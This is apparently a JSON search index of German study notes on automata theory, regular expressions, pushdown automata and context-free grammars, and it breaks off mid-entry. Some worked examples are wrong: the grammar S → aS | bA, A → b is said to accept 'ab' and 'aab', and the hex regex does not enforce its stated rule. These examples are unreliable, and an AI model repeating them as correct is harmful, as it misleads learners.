W\u00f6rter mit einer geraden Anzahl von \"0\": <code>(00)*</code></li> <li> <p>Besteht aus:</p> <ul> <li>Q: Menge der Zust\u00e4nde</li> <li>\u03a3: Eingabealphabet</li> <li>\u03b4: \u00dcbergangsfunktion (jedes Zeichen f\u00fchrt zu genau einem Zustand)</li> <li>q\u2080: Startzustand</li> <li>F: Menge der Endzust\u00e4nde (akzeptierende Zust\u00e4nde)</li> </ul> </li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/2.%20Regul%C3%A4re%20Sprachen%2C%20Endlicher%20Automat%2C%20Regul%C3%A4re%20Grammatik/#2-endliche-automaten-finite-automata","title":"2. Endliche Automaten (Finite Automata)","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/2.%20Regul%C3%A4re%20Sprachen%2C%20Endlicher%20Automat%2C%20Regul%C3%A4re%20Grammatik/#21-deterministischer-endlicher-automat-dfa","title":"2.1 Deterministischer Endlicher Automat (DFA)","text":"<ul> <li> <p>Eindeutige \u00dcberg\u00e4nge:     F\u00fcr jedes Symbol des Alphabets gibt es genau einen definierten \u00dcbergang pro Zustand.</p> <ul> <li> <p>Beispiel:     Wenn du in Zustand B bist und ein <code>b</code> liest, gibt es nur einen Weg, z.B.:</p> <p><code>B --b--&gt; C</code></p> </li> </ul> </li> <li> <p>Klare Pfade:     Es gibt immer genau einen Pfad, den der Automat bei einer bestimmten Eingabe verfolgt.</p> <ul> <li>Akzeptanz: Ein Wort wird akzeptiert, wenn dieser eindeutige Pfad in einem Endzustand endet.</li> <li>Denkweise: Keine Verzweigungen, keine Unsicherheit. Es gibt nur einen m\u00f6glichen Ablauf f\u00fcr jedes Wort.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/2.%20Regul%C3%A4re%20Sprachen%2C%20Endlicher%20Automat%2C%20Regul%C3%A4re%20Grammatik/#22-nichtdeterministischer-endlicher-automat-nfa","title":"2.2 Nichtdeterministischer Endlicher Automat (NFA)","text":"<ul> <li> <p>Mehrere M\u00f6glichkeiten:     F\u00fcr das gleiche Eingabesymbol kann es mehrere m\u00f6gliche \u00dcberg\u00e4nge geben.</p> <ul> <li> <p>Beispiel:     Aus Zustand B kannst du mit dem Symbol <code>b</code> sowohl nach A als auch nach C gelangen:</p> <p><code>B --b--&gt; A   B --b--&gt; C</code></p> </li> </ul> </li> <li> <p>\u201eParallele Wege\u201c:     Der Automat \u201eprobiert\u201c alle m\u00f6glichen Wege gleichzeitig aus (theoretisch betrachtet).</p> <ul> <li>Akzeptanz: Ein Wort wird akzeptiert, wenn mindestens ein Weg in einen Endzustand f\u00fchrt.</li> <li>Denkweise: Stelle dir vor, der Automat \u201eklont\u201c sich bei jeder Verzweigung und jeder Klon versucht seinen eigenen Weg.</li> <li>Epsilon-\u00dcberg\u00e4nge (\u03b5): NFAs k\u00f6nnen auch \u00dcberg\u00e4nge haben, bei denen kein Eingabesymbol gelesen wird, z.B.</li> </ul> <p><code>A --\u03b5--&gt; B</code></p> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/2.%20Regul%C3%A4re%20Sprachen%2C%20Endlicher%20Automat%2C%20Regul%C3%A4re%20Grammatik/#3-regulare-grammatiken","title":"3. Regul\u00e4re Grammatiken","text":"<ul> <li> <p>Definition: Eine Grammatik, die regul\u00e4re Sprachen beschreibt.</p> </li> <li> <p>Form: Produktionsregeln der Art:</p> <ul> <li> <p>Rechtslineare Grammatik: A \u2192 aB oder A \u2192 a</p> </li> <li> <p>Linkslineare Grammatik: A \u2192 Ba oder A \u2192 a</p> </li> </ul> </li> </ul> <p>Beispiel:</p> <pre><code>S \u2192 aS | bA\nA \u2192 b\n</code></pre> <p>Akzeptiert: \"ab\", \"aab\", \"aaab\", ...</p>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/2.%20Regul%C3%A4re%20Sprachen%2C%20Endlicher%20Automat%2C%20Regul%C3%A4re%20Grammatik/#4-typische-prufungsaufgaben","title":"4. Typische Pr\u00fcfungsaufgaben","text":"<ul> <li> <p>Erkennen von W\u00f6rtern durch Automaten: Pr\u00fcfen, ob ein Wort von einem DFA/NFA akzeptiert wird.</p> </li> <li> <p>Umwandeln von Automaten in regul\u00e4re Grammatiken: Jeder \u00dcbergang wird zu einer Produktionsregel.</p> </li> <li> <p>Umwandeln von Grammatiken in Automaten: Zust\u00e4nde repr\u00e4sentieren Variablen der Grammatik.</p> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/3.%20Determinismus%20und%20Potenzmengenkonstruktion/","title":"3. Determinismus und Potenzmengenkonstruktion","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/3.%20Determinismus%20und%20Potenzmengenkonstruktion/#thema-3-determinismus-potenzmengenkonstruktion-umwandlung-nfa-in-dfa","title":"Thema 3: Determinismus, Potenzmengenkonstruktion - Umwandlung NFA in DFA","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/3.%20Determinismus%20und%20Potenzmengenkonstruktion/#1-determinismus-dfa-vs-nichtdeterminismus-nfa","title":"1. Determinismus (DFA) vs. Nichtdeterminismus (NFA)","text":"<ul> <li> <p>Deterministischer Endlicher Automat (DFA):</p> <ul> <li> <p>Eigenschaft: F\u00fcr jedes Symbol des Alphabets gibt es genau einen definierten \u00dcbergang pro Zustand.</p> </li> <li> <p>Beispiel:</p> <ul> <li>Zustand A \u2192 (a) \u2192 Zustand B</li> <li>Zustand B \u2192 (b) \u2192 Zustand C</li> </ul> </li> <li> <p>Vorteil: Einfacher zu implementieren und zu verstehen.</p> </li> <li>Nachteil: Kann mehr Zust\u00e4nde ben\u00f6tigen als ein NFA.</li> </ul> </li> <li> <p>Nichtdeterministischer Endlicher Automat (NFA):</p> <ul> <li>Eigenschaft: F\u00fcr ein Eingabesymbol k\u00f6nnen mehrere \u00dcberg\u00e4nge m\u00f6glich sein.</li> <li>Beispiel:<ul> <li>Zustand A \u2192 (a) \u2192 Zustand B oder Zustand C</li> <li>Erlaubt auch \u03b5-\u00dcberg\u00e4nge (\u00dcberg\u00e4nge ohne Eingabesymbol).</li> </ul> </li> <li>Vorteil: Oft einfacher zu entwerfen.</li> <li>Nachteil: In der Praxis schwerer direkt umzusetzen.</li> </ul> </li> </ul> <p>Wichtige Erkenntnis: Jeder NFA kann in einen \u00e4quivalenten DFA umgewandelt werden.</p>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/3.%20Determinismus%20und%20Potenzmengenkonstruktion/#2-potenzmengenkonstruktion-subset-construction","title":"2. Potenzmengenkonstruktion (Subset Construction)","text":"<ul> <li>Definition: Ein Verfahren, um einen NFA in einen \u00e4quivalenten DFA umzuwandeln.</li> <li>Grundidee:<ul> <li>Jeder Zustand des DFA entspricht einer Menge von Zust\u00e4nden des NFA.</li> <li>Damit wird der nichtdeterministische Automat in einen deterministischen \u00fcberf\u00fchrt.</li> </ul> </li> </ul> <p>Schritte der Potenzmengenkonstruktion:</p> <ol> <li>Startzustand des DFA: Menge aller NFA-Startzust\u00e4nde (oft nur einer).</li> <li>F\u00fcr jedes Symbol: Berechne alle m\u00f6glichen Folgezust\u00e4nde (\u03b5-\u00dcberg\u00e4nge ber\u00fccksichtigen).</li> <li>Neue Zust\u00e4nde: Jeder neue Zustand im DFA entspricht einer neuen Kombination von NFA-Zust\u00e4nden.</li> <li>Endzust\u00e4nde: Jeder DFA-Zustand, der einen Endzustand des NFA enth\u00e4lt, wird ein Endzustand.</li> </ol>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/3.%20Determinismus%20und%20Potenzmengenkonstruktion/#3-beispiel-zur-potenzmengenkonstruktion","title":"3. Beispiel zur Potenzmengenkonstruktion","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/3.%20Determinismus%20und%20Potenzmengenkonstruktion/#4-anwendungsgebiete-der-potenzmengenkonstruktion","title":"4. Anwendungsgebiete der Potenzmengenkonstruktion","text":"<ul> <li>Compilerbau: Optimierung von regul\u00e4ren Ausdr\u00fccken.</li> <li>Spracherkennung: Verarbeitung komplexer regul\u00e4rer Sprachen.</li> <li>Theoretische Informatik: Nachweis der \u00c4quivalenz von NFA und DFA.</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/","title":"4. Regul\u00e4re Ausdr\u00fccke","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#4-grundlagen-der-regularen-ausdrucke-regex","title":"\ud83d\ude80 4: Grundlagen der Regul\u00e4ren Ausdr\u00fccke (Regex)","text":"<ul> <li>Konkatenation: <code>ab</code> \u2192 \u201ea\u201c gefolgt von \u201eb\u201c</li> <li>Alternation (ODER): <code>a|b</code> \u2192 \u201ea\u201c oder \u201eb\u201c</li> <li>Wiederholungen:<ul> <li><code>*</code> \u2192 0 oder mehr Wiederholungen (<code>a*</code> \u2192 \u201e\u201c, \u201ea\u201c, \u201eaa\u201c, \u2026)</li> <li><code>+</code> \u2192 1 oder mehr Wiederholungen (<code>a+</code> \u2192 \u201ea\u201c, \u201eaa\u201c, \u2026)</li> <li><code>?</code> \u2192 0 oder 1 Vorkommen (<code>a?</code> \u2192 \u201e\u201c oder \u201ea\u201c)</li> </ul> </li> <li>Gruppierung: <code>(ab)+</code> \u2192 \u201eab\u201c, \u201eabab\u201c, \u2026</li> <li>Zeichenklassen:<ul> <li><code>[a-z]</code> \u2192 Alle Kleinbuchstaben</li> <li><code>[0-9]</code> \u2192 Alle Ziffern</li> <li><code>[^abc]</code> \u2192 Alles au\u00dfer \u201ea\u201c, \u201eb\u201c, \u201ec\u201c</li> </ul> </li> <li>Escape-Sequenzen:<ul> <li><code>\\d</code> \u2192 Ziffer (0-9)</li> <li><code>\\w</code> \u2192 Alphanumerische Zeichen (Buchstaben, Ziffern, Unterstrich)</li> <li><code>\\s</code> \u2192 Whitespace (Leerzeichen, Tab, etc.)</li> <li><code>\\D</code>, <code>\\W</code>, <code>\\S</code> \u2192 Gegenteil von oben</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#2-vorgehensweise-zur-losung-der-aufgaben","title":"\ud83d\udd0d 2. Vorgehensweise zur L\u00f6sung der Aufgaben","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#aufgabe-1-2-prufung-von-wortern","title":"\u2705 Aufgabe 1 &amp; 2: Pr\u00fcfung von W\u00f6rtern","text":"<ul> <li>Ziel: Pr\u00fcfen, ob W\u00f6rter dem regul\u00e4ren Ausdruck entsprechen.</li> <li>Vorgehen:<ol> <li>Zerlege den regul\u00e4ren Ausdruck in seine Bestandteile.</li> <li>Vergleiche das Wort Schritt f\u00fcr Schritt.</li> <li>Finde das erste Zeichen, das nicht passt.</li> </ol> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#aufgabe-3-komplexere-ausdrucke","title":"\u2705 Aufgabe 3: Komplexere Ausdr\u00fccke","text":"<ul> <li>Aufbauanalyse:<ul> <li><code>(abc|def)</code> \u2192 Entweder \u201eabc\u201c oder \u201edef\u201c</li> <li><code>h?</code> \u2192 Optionales \u201eh\u201c</li> <li><code>[i-l]+</code> \u2192 Mindestens ein Zeichen zwischen \u201ei\u201c und \u201el\u201c</li> <li><code>(no)*</code> \u2192 Beliebig viele \u201eno\u201c (auch 0-mal)</li> <li><code>[^qrs]{2,}</code> \u2192 Mindestens 2 Zeichen, die nicht \u201eq\u201c, \u201er\u201c oder \u201es\u201c sind</li> <li><code>(uv)?</code> \u2192 Optional \u201euv\u201c</li> <li><code>\\wxyz</code> \u2192 Beliebiges alphanumerisches Zeichen gefolgt von \u201exyz\u201c</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#aufgabe-4-fhir-datentypen","title":"\u2705 Aufgabe 4: FHIR-Datentypen","text":"<ul> <li>Ziel: Werte finden, die zu den regul\u00e4ren Ausdr\u00fccken passen und welche, die nicht passen.</li> <li>Beispiele:<ul> <li>Integer: <code>123</code> \u2705, <code>12a</code> \u274c</li> <li>DateTime: <code>2023-03-15T10:00:00Z</code> \u2705, <code>2023/03/15</code> \u274c</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#aufgabe-5-hexadezimal-strings","title":"\u2705 Aufgabe 5: Hexadezimal-Strings","text":"<ul> <li>Anforderung:<ul> <li>Muss mit <code>0x</code> beginnen</li> <li>Danach Ziffern <code>0-9</code> und Buchstaben <code>A-F</code> (Gro\u00df- oder Kleinschreibung)</li> <li>Keine f\u00fchrenden Nullen (au\u00dfer bei \u201e0x0\u201c)</li> </ul> </li> </ul> <p><code>0x(?!0{2,})[A-Fa-f0-9]+</code></p>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#aufgabe-6-java-programm","title":"\u2705 Aufgabe 6: Java-Programm","text":"<ul> <li>Ziel: Ein Programm schreiben, das pr\u00fcft, ob ein String mit einem Regex \u00fcbereinstimmt.</li> <li>Kernlogik:<ul> <li>Verwende die Java-Klassen <code>Pattern</code> und <code>Matcher</code> aus <code>java.util.regex</code>.</li> <li>Beispiel (Java):</li> </ul> </li> </ul> \ud83d\udd0d Java-Code REGEX <pre><code>import java.util.regex.*;\n\npublic class RegexChecker {\n    public static void main(String[] args) {\n        String regex = \"a*b\"; \n        String input = \"aaab\";\n\n        boolean matches = Pattern.matches(regex, input);\n        System.out.println(matches);  // true\n    }\n}\n</code></pre>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#aufgabe-7-eigene-regex-erstellen","title":"\u2705 Aufgabe 7: Eigene Regex erstellen","text":"<ul> <li>Beispiele:<ul> <li>Uhrzeit (xx:yy:zz.sss): <code>\\d{2}:\\d{2}:\\d{2}\\.\\d{3}</code></li> <li>Blutgruppen: <code>(A|B|AB|0)(pos|neg)</code></li> <li>Medikamenten-Intervalle: <code>(0|[1-9])-(0|[1-9])-(0|[1-9])</code></li> <li>Keine Umlaute: <code>^[^\u00e4\u00f6\u00fc\u00c4\u00d6\u00dc\u00df]*$</code></li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#aufgabe-8-regex101-wikipedia-analyse","title":"\u2705 Aufgabe 8: Regex101 &amp; Wikipedia-Analyse","text":"<ol> <li> <p>Jahreszahlen (1000-1999): <code>1[0-9]{3}</code></p> </li> <li> <p>Quellenverweise (Zahl in eckigen Klammern): <code>\\[\\d+\\]</code></p> </li> <li> <p>ISBN-Nummern: <code>ISBN[- ]?(?:\\d{10}|\\d{13})</code></p> </li> <li> <p>W\u00f6rter mit Gro\u00dfbuchstaben, ohne a, e, n, t, r: <code>\\b[A-Z][^aenrt\\s]*\\b</code></p> </li> <li> <p>W\u00f6rter mit \u226510 Zeichen, endend mit n oder r: <code>\\b\\w{9,}[nr]\\b</code></p> </li> </ol>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#zusammenfassung","title":"\ud83d\udcdd Zusammenfassung:","text":"<ul> <li>Regex-Grundlagen verstehen (Konkatenation, ODER, Wiederholungen, etc.)</li> <li>Komplexe Muster in kleinere Einheiten zerlegen</li> <li>F\u00fcr Java-Aufgaben Regex mit <code>Pattern</code> und <code>Matcher</code> umsetzen</li> <li>Fehlerquellen identifizieren (z.B. erste Abweichung in Zeichenketten)</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#regex-cheat-sheet-regulare-ausdrucke","title":"\ud83d\udccb Regex Cheat Sheet (Regul\u00e4re Ausdr\u00fccke)","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#1-grundlegende-syntax","title":"\u2705 1. Grundlegende Syntax","text":"<ul> <li>Konkatenation: <code>ab</code> \u2192 \"a\" gefolgt von \"b\"</li> <li>Alternation (ODER): <code>a|b</code> \u2192 \"a\" oder \"b\"</li> <li>Gruppierung: <code>(abc)</code> \u2192 Behandelt \"abc\" als eine Einheit</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#2-quantifizierer-wiederholungen","title":"\u2728 2. Quantifizierer (Wiederholungen)","text":"<ul> <li><code>*</code> \u2192 0 oder mehr Wiederholungen (z.B. <code>a*</code> \u2192 \"\", \"a\", \"aa\", \"aaa\")</li> <li><code>+</code> \u2192 1 oder mehr Wiederholungen (z.B. <code>a+</code> \u2192 \"a\", \"aa\", \"aaa\")</li> <li><code>?</code> \u2192 0 oder 1 Vorkommen (z.B. <code>a?</code> \u2192 \"\", \"a\")</li> <li><code>{n}</code> \u2192 Genau n Wiederholungen (z.B. <code>a{3}</code> \u2192 \"aaa\")</li> <li><code>{n,}</code> \u2192 Mindestens n Wiederholungen (z.B. <code>a{2,}</code> \u2192 \"aa\", \"aaa\", \"aaaa\")</li> <li><code>{n,m}</code> \u2192 Zwischen n und m Wiederholungen (z.B. <code>a{2,4}</code> \u2192 \"aa\", \"aaa\", \"aaaa\")</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#3-zeichenklassen","title":"\ud83d\udd0d 3. Zeichenklassen","text":"<ul> <li><code>[abc]</code> \u2192 a, b oder c</li> <li><code>[^abc]</code> \u2192 NICHT a, b oder c (Negation)</li> <li><code>[a-z]</code> \u2192 Alle Kleinbuchstaben von a bis z</li> <li><code>[A-Z]</code> \u2192 Alle Gro\u00dfbuchstaben von A bis Z</li> <li><code>[0-9]</code> \u2192 Alle Ziffern von 0 bis 9</li> <li><code>[a-zA-Z0-9]</code> \u2192 Alphanumerische Zeichen</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#4-metazeichen-escape-sequenzen","title":"\ud83d\ude80 4. Metazeichen &amp; Escape-Sequenzen","text":"<ul> <li><code>.</code> \u2192 Beliebiges Zeichen (au\u00dfer Zeilenumbruch)</li> <li><code>\\</code> \u2192 Escape-Zeichen (z.B. <code>\\.</code> f\u00fcr einen echten Punkt)</li> <li><code>\\d</code> \u2192 Ziffer (entspricht <code>[0-9]</code>)</li> <li><code>\\D</code> \u2192 Keine Ziffer (entspricht <code>[^0-9]</code>)</li> <li><code>\\w</code> \u2192 Wortzeichen (Buchstaben, Ziffern, Unterstrich)</li> <li><code>\\W</code> \u2192 Kein Wortzeichen</li> <li><code>\\s</code> \u2192 Whitespace (Leerzeichen, Tab, Zeilenumbruch)</li> <li><code>\\S</code> \u2192 Kein Whitespace</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#5-anker-positionsmarker","title":"\ud83c\udfaf 5. Anker (Positionsmarker)","text":"<ul> <li><code>^</code> \u2192 Anfang der Zeile (z.B. <code>^abc</code> \u2192 \"abc\" am Zeilenanfang)</li> <li><code>$</code> \u2192 Ende der Zeile (z.B. <code>xyz$</code> \u2192 \"xyz\" am Zeilenende)</li> <li><code>\\b</code> \u2192 Wortgrenze (z.B. <code>\\bword\\b</code> findet genau \"word\")</li> <li><code>\\B</code> \u2192 Keine Wortgrenze</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#6-lookahead-lookbehind-advanced","title":"\ud83e\udde9 6. Lookahead &amp; Lookbehind (Advanced)","text":"<ul> <li>Positive Lookahead: <code>X(?=Y)</code> \u2192 Match \"X\", wenn direkt danach \"Y\" folgt</li> <li>Negative Lookahead: <code>X(?!Y)</code> \u2192 Match \"X\", wenn NICHT \"Y\" folgt</li> <li>Positive Lookbehind: <code>(?&lt;=Y)X</code> \u2192 Match \"X\", wenn davor \"Y\" steht</li> <li>Negative Lookbehind: <code>(?&lt;!Y)X</code> \u2192 Match \"X\", wenn davor NICHT \"Y\" steht</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#7-beispiele","title":"\ud83d\udcca 7. Beispiele","text":"<ul> <li>E-Mail: <code>[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}</code></li> <li>IP-Adresse: <code>\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b</code></li> <li>Datum (YYYY-MM-DD): <code>\\d{4}-\\d{2}-\\d{2}</code></li> <li>Hexadezimalzahl: <code>0x[0-9A-Fa-f]+</code></li> <li>Telefonnummer (DE): <code>\\+49\\s?\\d{3,4}\\s?\\d{6,8}</code></li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/4.%20Regul%C3%A4re%20Ausdr%C3%BCcke/#8-nutzliche-regex-tools","title":"\ud83d\ude80 8. N\u00fctzliche Regex-Tools","text":"<ul> <li>regex101.com - Online-Tool zur Regex-Analyse</li> <li>RegExr - Interaktiver Regex-Tester</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/","title":"5. Kellerautomat (PDA) und Kontextfreie Grammatik (CFG)","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#thema-5-kellerautomat-pda-und-kontextfreie-grammatik-cfg","title":"Thema 5: Kellerautomat (PDA) und Kontextfreie Grammatik (CFG)","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#1-kellerautomat-pda-pushdown-automaton","title":"\u2705 1. Kellerautomat (PDA - Pushdown Automaton)","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#definition","title":"\ud83d\udccc Definition:","text":"<ul> <li> <p>Ein Kellerautomat (PDA) ist ein endlicher Automat mit einem zus\u00e4tzlichen Stack (Keller).</p> </li> <li> <p>Er kann nicht nur den aktuellen Zustand und das Eingabesymbol verwenden, sondern auch das oberste Symbol des Stacks ber\u00fccksichtigen.</p> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#bestandteile","title":"\ud83d\uddc2\ufe0f Bestandteile:","text":"<ul> <li> <p>Q: Menge der Zust\u00e4nde</p> </li> <li> <p>\u03a3: Eingabealphabet</p> </li> <li> <p>\u0393: Stackalphabet</p> </li> <li> <p>\u03b4: \u00dcbergangsfunktion <code>\u03b4: Q \u00d7 (\u03a3 \u222a {\u03b5}) \u00d7 (\u0393 \u222a {\u03b5}) \u2192 P(Q \u00d7 (\u0393 \u222a {\u03b5}))</code></p> </li> <li> <p>q\u2080: Startzustand</p> </li> <li> <p>Z\u2080: Startsymbol des Stacks</p> </li> <li> <p>F: Menge der Endzust\u00e4nde</p> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#arbeitsweise","title":"\u2699\ufe0f Arbeitsweise:","text":"<ol> <li> <p>Lesen eines Eingabesymbols (oder \u03b5-\u00dcbergang ohne Lesen).</p> </li> <li> <p>Stackoperationen:</p> <ul> <li> <p>Push: Symbol auf den Stack legen.</p> </li> <li> <p>Pop: Symbol vom Stack entfernen.</p> </li> <li> <p>Keine \u00c4nderung: Stack bleibt unver\u00e4ndert.</p> </li> </ul> </li> <li> <p>\u00dcbergang zu einem neuen Zustand.</p> </li> </ol>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#beispiel","title":"\ud83d\udcca **Beispiel","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#2-kontextfreie-grammatik-cfg","title":"\u2705 2. Kontextfreie Grammatik (CFG)","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#definition_1","title":"\ud83d\udccc Definition:","text":"<ul> <li> <p>Eine Kontextfreie Grammatik (CFG) definiert formale Sprachen mithilfe von Produktionsregeln.</p> </li> <li> <p>Form einer Produktionsregel: <code>A \u2192 \u03b1</code></p> <ul> <li> <p>A: Ein Nichtterminalsymbol.</p> </li> <li> <p>\u03b1: Eine beliebige Kombination aus Terminal- und Nichtterminalsymbolen.</p> </li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#bestandteile_1","title":"\ud83d\uddc2\ufe0f Bestandteile:","text":"<ul> <li> <p>V: Menge der Variablen (Nichtterminalsymbole)</p> </li> <li> <p>\u03a3: Menge der Terminalsymbole</p> </li> <li> <p>R: Menge der Produktionsregeln</p> </li> <li> <p>S: Startsymbol</p> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#beispiel_1","title":"\ud83d\ude80 **Beispiel","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#3-zusammenhang-zwischen-pda-und-cfg","title":"\ud83d\udd17 3. Zusammenhang zwischen PDA und CFG","text":"<ul> <li> <p>Wichtige Erkenntnis:</p> <ul> <li> <p>Jede kontextfreie Sprache (CFL) kann von einem Kellerautomaten (PDA) erkannt werden.</p> </li> <li> <p>Jeder PDA kann in eine CFG umgewandelt werden und umgekehrt.</p> </li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#umwandlung-pda-cfg","title":"\u26a1 Umwandlung PDA \u2192 CFG:","text":"<ol> <li> <p>Erstelle Regeln, die die Stack-Operationen des PDA simulieren.</p> </li> <li> <p>Push-Operation = Hinzuf\u00fcgen von Symbolen in der Grammatik.</p> </li> <li> <p>Pop-Operation = Abbau der Rekursion in der Grammatik.</p> </li> </ol>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#umwandlung-cfg-pda","title":"\u26a1 Umwandlung CFG \u2192 PDA:","text":"<ol> <li> <p>PDA simuliert die Ableitungsregeln der CFG.</p> </li> <li> <p>Der Stack dient dazu, Nichtterminalsymbole zu speichern.</p> </li> <li> <p>PDA \u201eerweitert\u201c die Grammatikregeln, bis das Eingabewort vollst\u00e4ndig verarbeitet ist.</p> </li> </ol>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#4-typische-prufungsaufgaben","title":"\ud83d\udcdd 4. Typische Pr\u00fcfungsaufgaben","text":"<ul> <li> <p>Ableitung von W\u00f6rtern mit einer CFG:</p> <ul> <li> <p>Beispiel: F\u00fcr <code>S \u2192 aSb | \u03b5</code>, leite das Wort <code>aaabbb</code> ab:</p> <pre><code>S \u2192 aSb\n  \u2192 aaSbb\n  \u2192 aaaSbbb\n  \u2192 aaabbb\n</code></pre> </li> </ul> </li> <li> <p>Konstruieren eines PDA:</p> <ul> <li> <p>Aufgabe: Erstelle einen PDA f\u00fcr <code>L = {ww^R | w \u2208 {0,1}*}</code> (palindromische W\u00f6rter).</p> </li> <li> <p>L\u00f6sung:</p> <ul> <li> <p>Push-Phase: Symbole von <code>w</code> auf den Stack legen.</p> </li> <li> <p>Pop-Phase: Symbole mit <code>w^R</code> vergleichen.</p> </li> </ul> </li> </ul> </li> <li> <p>Umwandeln von PDA in CFG:</p> <ul> <li>Definiere Regeln, die den Stack-Zustand beschreiben.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/5.%20Kellerautomat%20%28PDA%29%20und%20Kontextfreie%20Grammatik%20%28CFG%29/#5-anwendungsgebiete","title":"\ud83c\udfaf 5. Anwendungsgebiete","text":"<ul> <li> <p>Compilerbau: Syntaxanalyse von Programmiersprachen.</p> </li> <li> <p>Formale Sprachen: Definition von Programmiersprachen und Protokollen.</p> </li> <li> <p>Spracherkennung: Verarbeitung nat\u00fcrlicher Sprache.</p> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/6.%20Chomsky-Normalform/","title":"6. Chomsky 